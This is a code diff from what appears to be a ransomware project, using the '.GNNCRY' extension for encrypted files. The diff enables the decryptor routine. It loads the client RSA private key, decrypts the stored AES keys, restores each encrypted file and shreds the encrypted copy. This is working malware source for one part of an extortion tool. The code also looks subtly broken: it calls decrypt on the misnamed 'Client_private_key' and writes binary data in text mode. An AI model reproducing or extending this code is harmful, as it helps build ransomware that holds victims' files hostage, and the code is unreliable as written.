@@ -79,41 +79,41 @@ def menu():
     with open(ransomware_path + "/client_private_key.PEM", 'wb') as f:
         f.write(client_private_key)
 
-    # # Private key object
-    # client_private_key_object = RSA.importKey(client_private_key)
+    # Private key object
+    client_private_key_object = RSA.importKey(client_private_key)
 
     # GET THE AES KEYS and path
-    # with open(ransomware_path + "/AES_encrypted_keys") as f:
-    #     content = f.read()
+    with open(ransomware_path + "/AES_encrypted_keys") as f:
+        content = f.read()
      
-    # # get the aes keys and IV's and paths back
-    # content = content.split('\n')
-    # aes_and_path = []
-    # for line in content:
-    #     ret = line.split(' ') # enc(KEY) base64(PATH)
-    #     encrypted_aes_key = ret[0]
-    #     aes_key = Client_private_key.decrypt(encrypted_aes_key)
+    # get the aes keys and IV's and paths back
+    content = content.split('\n')
+    aes_and_path = []
+    for line in content:
+        ret = line.split(' ') # enc(KEY) base64(PATH)
+        encrypted_aes_key = ret[0]
+        aes_key = Client_private_key.decrypt(encrypted_aes_key)
 
-    #     aes_and_path.append((aes_key, base64.b64decode(ret[1])))
+        aes_and_path.append((aes_key, base64.b64decode(ret[1])))
 
-    # for _ in aes_and_path:
-    #     dec = symmetric.AESCipher(_[0])
+    for _ in aes_and_path:
+        dec = symmetric.AESCipher(_[0])
         
-    #     with open(_[1], 'rb') as f:
-    #         encrypted_file_content = f.read()
+        with open(_[1], 'rb') as f:
+            encrypted_file_content = f.read()
         
-    #     # decrypt content
-    #     decrypted_file_content = dec.decrypt(encrypted_file_content)
+        # decrypt content
+        decrypted_file_content = dec.decrypt(encrypted_file_content)
 
-    #     # save into new file without .GNNCRY extension
-    #     old_file_name = _[1].replace(".GNNCRY", "")
-    #     with open(old_file_name, 'w') as f:
-    #         f.write(decrypted_file_content)
+        # save into new file without .GNNCRY extension
+        old_file_name = _[1].replace(".GNNCRY", "")
+        with open(old_file_name, 'w') as f:
+            f.write(decrypted_file_content)
         
-    #     # delete old encrypted file
-    #     shred(_[1])
+        # delete old encrypted file
+        shred(_[1])
 
-    # # end of decryptor
+    # end of decryptor
 
 if __name__ == "__main__": 
     menu()
